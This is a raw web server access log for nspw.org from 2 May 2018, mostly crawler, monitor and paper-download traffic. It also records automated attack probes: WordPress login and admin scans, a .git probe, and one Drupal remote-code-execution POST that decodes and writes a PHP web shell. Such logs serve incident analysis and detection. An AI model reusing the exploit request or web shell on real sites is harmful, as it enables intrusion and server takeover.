www.nspw.org:80 105.229.137.120 - - [02/May/2018:17:00:50 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 180.76.15.136 - - [02/May/2018:17:01:11 -0400] "GET /2011/ HTTP/1.1" 302 502 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 207.46.13.1 - - [02/May/2018:17:05:10 -0400] "GET /papers/2004/nspw2004-sadeghi.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:17:05:24 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 122.177.90.127 - - [02/May/2018:17:06:02 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 122.177.90.127 - - [02/May/2018:17:06:07 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 222.89.74.225 - - [02/May/2018:17:07:13 -0400] "GET /papers/2009/nspw2009-johnson.pdf HTTP/1.1" 302 537 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36"
www.nspw.org:80 211.115.79.122 - - [02/May/2018:17:07:33 -0400] "GET / HTTP/1.1" 302 525 "-" "Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36"
www.nspw.org:80 34.203.217.206 - - [02/May/2018:17:08:09 -0400] "GET /cfp/flyer_NSPW_2014.pdf HTTP/1.1" 302 571 "-" "python-requests/2.18.4"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:17:10:24 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 173.212.228.153 - - [02/May/2018:17:11:20 -0400] "GET / HTTP/1.1" 302 469 "-" "Go-http-client/1.1"
www.nspw.org:80 41.248.156.149 - - [02/May/2018:17:12:03 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 41.248.156.149 - - [02/May/2018:17:12:05 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 222.89.74.225 - - [02/May/2018:17:12:14 -0400] "GET /papers/2009/nspw2009-johnson.pdf HTTP/1.1" 302 537 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:17:15:23 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 5.189.150.18 - - [02/May/2018:17:15:34 -0400] "GET / HTTP/1.1" 302 494 "-" "libwww-perl/6.33"
www.nspw.org:80 73.15.7.132 - - [02/May/2018:17:18:27 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 73.15.7.132 - - [02/May/2018:17:18:28 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 137.112.228.195 - - [02/May/2018:17:19:11 -0400] "GET /papers/2007/nspw2007-mannan.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1"
www.nspw.org:80 216.244.66.236 - - [02/May/2018:17:19:13 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:17:20:22 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 216.244.66.200 - - [02/May/2018:17:21:39 -0400] "GET /2003/past.shtml HTTP/1.1" 302 503 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:17:25:21 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 157.55.39.141 - - [02/May/2018:17:27:53 -0400] "GET /papers/2002/nspw2002-capkun.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 216.244.66.200 - - [02/May/2018:17:28:53 -0400] "GET /papers/2007/?C=N;O=A HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 216.244.66.200 - - [02/May/2018:17:29:26 -0400] "GET /papers/2004/?C=D;O=D HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 216.244.66.200 - - [02/May/2018:17:29:57 -0400] "GET /papers/1998/?C=M;O=A HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:17:30:21 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 216.244.66.200 - - [02/May/2018:17:30:36 -0400] "GET /2009/proceedings/2013/?C=S;O=D HTTP/1.1" 302 533 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 216.244.66.200 - - [02/May/2018:17:31:53 -0400] "GET /2009/proceedings/2012/forms/index.htm HTTP/1.1" 302 547 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 223.218.104.68 - - [02/May/2018:17:31:55 -0400] "GET / HTTP/1.1" 302 525 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
www.nspw.org:80 216.244.66.200 - - [02/May/2018:17:32:03 -0400] "GET /2009/proceedings/2000/?C=N;O=D HTTP/1.1" 302 533 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 192.95.30.29 - - [02/May/2018:17:32:40 -0400] "GET /payload.php HTTP/1.0" 302 551 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"
www.nspw.org:80 192.95.30.29 - - [02/May/2018:17:32:40 -0400] "GET /payload.php HTTP/1.0" 302 551 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"
www.nspw.org:80 180.76.15.138 - - [02/May/2018:17:34:31 -0400] "GET /2008 HTTP/1.1" 302 500 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 157.55.39.141 - - [02/May/2018:17:34:44 -0400] "GET /papers/2001/nspw2001-brostoff.pdf HTTP/1.1" 302 595 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:17:35:21 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 216.244.66.200 - - [02/May/2018:17:35:33 -0400] "GET /papers/1996/?C=M;O=A HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:17:40:22 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 207.46.13.179 - - [02/May/2018:17:41:55 -0400] "GET /papers/2002/nspw2002-venkatakrishnan.pdf HTTP/1.1" 302 609 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:17:45:22 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 199.59.150.181 - - [02/May/2018:17:48:00 -0400] "GET /robots.txt HTTP/1.1" 302 489 "-" "Twitterbot/1.0"
www.nspw.org:80 199.59.150.181 - - [02/May/2018:17:48:01 -0400] "GET /2018/cfp HTTP/1.1" 302 485 "-" "Twitterbot/1.0"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:17:50:22 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 85.191.17.44 - - [02/May/2018:17:51:51 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 85.191.17.44 - - [02/May/2018:17:51:52 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 201.221.81.199 - - [02/May/2018:17:52:14 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 201.221.81.199 - - [02/May/2018:17:52:15 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 112.25.223.120 - - [02/May/2018:17:52:33 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 112.25.223.120 - - [02/May/2018:17:52:35 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 213.57.18.47 - - [02/May/2018:17:53:28 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 213.57.18.47 - - [02/May/2018:17:53:29 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 77.88.47.40 - - [02/May/2018:17:53:36 -0400] "GET /robots.txt HTTP/1.1" 302 545 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
www.nspw.org:80 100.43.91.123 - - [02/May/2018:17:53:36 -0400] "GET / HTTP/1.1" 302 529 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
www.nspw.org:80 77.88.47.40 - - [02/May/2018:17:53:40 -0400] "GET / HTTP/1.1" 302 524 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
www.nspw.org:80 31.223.145.204 - - [02/May/2018:17:53:57 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 31.223.145.204 - - [02/May/2018:17:54:02 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:17:55:22 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.64.210 - - [02/May/2018:17:58:24 -0400] "GET /papers/2009/nspw2009-herley.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 95.121.25.130 - - [02/May/2018:17:59:02 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 95.121.25.130 - - [02/May/2018:17:59:04 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 88.208.244.37 - - [02/May/2018:17:59:34 -0400] "GET /wp-admin/ HTTP/1.1" 302 506 "-" "-"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:18:00:21 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 125.99.176.102 - - [02/May/2018:18:01:54 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 125.99.176.102 - - [02/May/2018:18:01:56 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 157.55.39.141 - - [02/May/2018:18:02:51 -0400] "GET /papers/2005/nspw2005-taylor-pos.pdf HTTP/1.1" 302 599 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:18:05:21 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 77.75.78.162 - - [02/May/2018:18:06:36 -0400] "GET /robots.txt HTTP/1.1" 302 549 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.78.162 - - [02/May/2018:18:06:38 -0400] "GET /cfp/flyer_NSPW_2013.pdf HTTP/1.1" 302 575 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.78.162 - - [02/May/2018:18:06:39 -0400] "GET /2009/NSPWtrans.gif HTTP/1.1" 302 564 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.78.162 - - [02/May/2018:18:06:40 -0400] "GET /2009/program.shtml HTTP/1.1" 302 564 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.78.162 - - [02/May/2018:18:06:40 -0400] "GET /2006/oc.content HTTP/1.1" 302 558 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.78.162 - - [02/May/2018:18:06:40 -0400] "GET /2014/program HTTP/1.1" 302 552 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.78.162 - - [02/May/2018:18:06:41 -0400] "GET /node/70 HTTP/1.1" 302 542 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 149.255.62.71 - - [02/May/2018:18:06:46 -0400] "GET /test/wp-admin/ HTTP/1.1" 302 516 "-" "-"
www.nspw.org:80 189.24.79.150 - - [02/May/2018:18:08:55 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 189.24.79.150 - - [02/May/2018:18:09:07 -0400] "GET / HTTP/1.1" 302 529 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:18:10:21 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 195.22.127.231 - - [02/May/2018:18:10:34 -0400] "GET /.git/HEAD HTTP/1.1" 302 549 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"
www.nspw.org:80 66.249.64.208 - - [02/May/2018:18:10:49 -0400] "GET /papers/2013/nspw2013-peisert.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 91.238.161.174 - - [02/May/2018:18:13:44 -0400] "GET /wordpress/wp-admin/ HTTP/1.1" 302 526 "-" "-"
www.nspw.org:80 216.244.66.200 - - [02/May/2018:18:13:47 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:18:15:21 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 54.36.148.204 - - [02/May/2018:18:15:30 -0400] "GET /2005/cfp.shtml HTTP/1.1" 302 501 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 207.46.13.179 - - [02/May/2018:18:15:39 -0400] "GET /papers/1994/nspw1994-spalka.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 185.232.20.242 - - [02/May/2018:18:16:24 -0400] "GET /user/login HTTP/1.1" 302 489 "http://nspw.org/user/login" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0"
www.nspw.org:80 185.232.20.242 - - [02/May/2018:18:16:24 -0400] "GET /user/login HTTP/1.1" 302 489 "http://nspw.org/user/login" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0"
www.nspw.org:80 185.232.20.242 - - [02/May/2018:18:16:25 -0400] "GET /user/login HTTP/1.1" 302 489 "http://nspw.org/user/login" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0"
www.nspw.org:80 207.46.13.54 - - [02/May/2018:18:16:54 -0400] "GET /papers/2001/nspw2001-pal.pdf HTTP/1.1" 302 585 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 82.245.116.232 - - [02/May/2018:18:18:05 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 82.245.116.232 - - [02/May/2018:18:18:06 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 41.113.85.105 - - [02/May/2018:18:18:39 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 41.113.85.105 - - [02/May/2018:18:18:41 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:18:20:21 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 207.46.13.1 - - [02/May/2018:18:20:50 -0400] "GET /papers/2006/nspw2006-wang.pdf HTTP/1.1" 302 587 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 74.220.207.85 - - [02/May/2018:18:20:53 -0400] "GET /blog/wp-admin/ HTTP/1.1" 302 516 "-" "-"
www.nspw.org:80 199.16.157.182 - - [02/May/2018:18:22:34 -0400] "GET /robots.txt HTTP/1.1" 302 489 "-" "Twitterbot/1.0"
www.nspw.org:80 199.16.157.182 - - [02/May/2018:18:22:34 -0400] "GET /2018/cfp HTTP/1.1" 302 485 "-" "Twitterbot/1.0"
www.nspw.org:80 2.51.96.191 - - [02/May/2018:18:23:10 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 2.51.96.191 - - [02/May/2018:18:23:15 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:18:25:21 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 103.242.190.75 - - [02/May/2018:18:26:09 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 103.242.190.75 - - [02/May/2018:18:26:10 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 103.24.201.4 - - [02/May/2018:18:27:50 -0400] "GET /wp/wp-admin/ HTTP/1.1" 302 512 "-" "-"
www.nspw.org:80 190.137.186.115 - - [02/May/2018:18:28:05 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:18:30:21 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 187.59.119.3 - - [02/May/2018:18:33:05 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 187.59.119.3 - - [02/May/2018:18:33:09 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 59.124.153.166 - - [02/May/2018:18:33:26 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 164.160.91.11 - - [02/May/2018:18:34:43 -0400] "GET /old/wp-admin/ HTTP/1.1" 302 514 "-" "-"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:18:35:21 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.64.210 - - [02/May/2018:18:35:38 -0400] "GET /papers/2011/nspw2011-bishop.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 207.46.13.179 - - [02/May/2018:18:36:15 -0400] "GET /papers/2001/nspw2001-yan.pdf HTTP/1.1" 302 581 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 207.46.13.54 - - [02/May/2018:18:36:38 -0400] "GET /papers/1996/nspw1996-de_capitani_di_vimercati.pdf HTTP/1.1" 302 623 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 207.46.13.1 - - [02/May/2018:18:37:28 -0400] "GET /papers/2009/nspw2009-gates.pdf HTTP/1.1" 302 589 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 200.125.104.68 - - [02/May/2018:18:37:29 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 200.125.104.68 - - [02/May/2018:18:37:31 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 157.55.39.141 - - [02/May/2018:18:37:31 -0400] "GET /papers/2006/nspw2006-gutmann.pdf HTTP/1.1" 302 589 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 207.46.13.54 - - [02/May/2018:18:39:04 -0400] "GET /papers/1998/nspw1998-cowan.pdf HTTP/1.1" 302 589 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
